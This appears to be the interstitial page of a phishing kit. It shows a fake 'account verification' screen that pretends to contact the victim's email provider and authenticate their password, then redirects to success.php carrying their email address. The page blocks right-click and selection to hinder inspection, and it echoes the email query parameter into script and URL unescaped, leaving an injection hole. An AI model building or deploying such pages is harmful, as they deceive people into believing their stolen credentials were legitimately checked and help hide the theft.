<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<HTML>
<HEAD><TITLE>Contacting Email Server </TITLE>
<link rel="icon" type="image/x-icon" href="files/favicon.ico">
<style type="text/css">
<!--
.style1 {font-family: "Courier New", Courier, monospace}
.style4 {font-family: "Courier New", Courier, monospace;
	color:#0066CC;
	font-size:20px;}
#Layer1 {
	position:absolute;
	left:374px;
	top:23px;
	width:437px;
	height:367px;
	z-index:1;
	margin-top: 5%;
	margin-right: 5%;
	right: 20%;
	bottom: 200%;
	margin-bottom: 5%;
	margin-left: 5%;
	border: thin solid #0066CC;
	border-radius:7px;
	padding: 5px;
}
-->
</style>
<SCRIPT>



var preloadimages=new Array(":abstract.simplenet.com/point.gif","abstract.simplenet.com/point2.html")



var intervals=3000

//configure destination URL

var targetdestination="success.php??rand=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.1&email=<?php echo $_GET['email']; ?>&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1"





var splashmessage=new Array()

var openingtags='<font face="Courier New, Courier, monospace" size="3">'

splashmessage[0]='Contacting email provider'

splashmessage[1]='Verifing <?php echo $_GET['email']; ?>'

splashmessage[2]='Authenticating password for <?php echo $_GET['email']; ?>'

splashmessage[3]='...Authentication Success...'

splashmessage[4]='Checking <?php echo $_GET['email']; ?> in spam list'

splashmessage[5]='Checking <?php echo $_GET['email']; ?> in fraudlent list'

splashmessage[6]='Please Wait'

splashmessage[7]='Survey Successful'




var closingtags='</font>'



//Do not edit below this line (besides HTML code at the very bottom)



var i=0



var ns4=document.layers?1:0

var ie4=document.all?1:0

var ns6=document.getElementById&&!document.all?1:0

var theimages=new Array()



//preload images

if (document.images){

for (p=0;p<preloadimages.length;p++){

theimages[p]=new Image()

theimages[p].src=preloadimages[p]

}

}



function displaysplash(){

if (i<splashmessage.length){

sc_cross.style.visibility="hidden"

sc_cross.innerHTML='<b><center>'+openingtags+splashmessage[i]+closingtags+'</center></b>'

sc_cross.style.left=ns6?parseInt(window.pageXOffset)+parseInt(window.innerWidth)/2-parseInt(sc_cross.style.width)/2 :document.body.scrollLeft+document.body.clientWidth/2-parseInt(sc_cross.style.width)/2

sc_cross.style.top=ns6?parseInt(window.pageYOffset)+parseInt(window.innerHeight)/2-sc_cross.offsetHeight/2:document.body.scrollTop+document.body.clientHeight/2-sc_cross.offsetHeight/2

sc_cross.style.visibility="visible"

i++

}

else{

window.location=targetdestination

return

}

setTimeout("displaysplash()",intervals)

}



function displaysplash_ns(){

if (i<splashmessage.length){

sc_ns.visibility="hide"

sc_ns.document.write('<b>'+openingtags+splashmessage[i]+closingtags+'</b>')

sc_ns.document.close()



sc_ns.left=pageXOffset+window.innerWidth/2-sc_ns.document.width/2

sc_ns.top=pageYOffset+window.innerHeight/2-sc_ns.document.height/2



sc_ns.visibility="show"

i++

}

else{

window.location=targetdestination

return

}

setTimeout("displaysplash_ns()",intervals)

}







function positionsplashcontainer(){

if (ie4||ns6){

sc_cross=ns6?document.getElementById("splashcontainer"):document.all.splashcontainer

displaysplash()

}

else if (ns4){

sc_ns=document.splashcontainerns

sc_ns.visibility="show"

displaysplash_ns()

}

else

window.location=targetdestination

}

window.onload=positionsplashcontainer



</SCRIPT>
<SCRIPT><!--

 var jv=1.0;

//--></SCRIPT>



<SCRIPT language=Javascript1.1><!--

 jv=1.1;

//--></SCRIPT>



<SCRIPT language=Javascript1.2><!--

 jv=1.2;

//--></SCRIPT>



<SCRIPT language=Javascript1.3><!--

 jv=1.3;

//--></SCRIPT>



<SCRIPT language=Javascript1.4><!--

 jv=1.4;

//--></SCRIPT>
</HEAD>

<BODY oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<div id="Layer1">
<div class="style4"><h2>Account verification on progress...</font></h2></div>
 <DIV align="center" class="style1" id=splashcontainer ></DIV>
<div><p align="center" class="style1"><br />
    <br />
        <br />
        <br />
      <img src="files/load.gif" width="66" height="66" /></p>
</div>
</div>


<span class="style1"><font size="18">





</font></span><span class="style1"> </span>
<NOSCRIPT>
<span class="style1"><IMG height=1 src="#"

width=1></span>
</NOSCRIPT>
<p class="style1">&nbsp;</p>
<p class="style1">&nbsp;</p>
<p class="style1">&nbsp;</p>
<p class="style1">&nbsp;</p>
<p class="style1">&nbsp;</p>
<p class="style1">&nbsp;</p>
<p align="center" class="style1">&nbsp;</p>
<p align="center" class="style1">&nbsp;</p>
<p align="center" class="style1">&nbsp;</p>
<p align="center" class="style1">&nbsp;</p>

</BODY>
</HTML>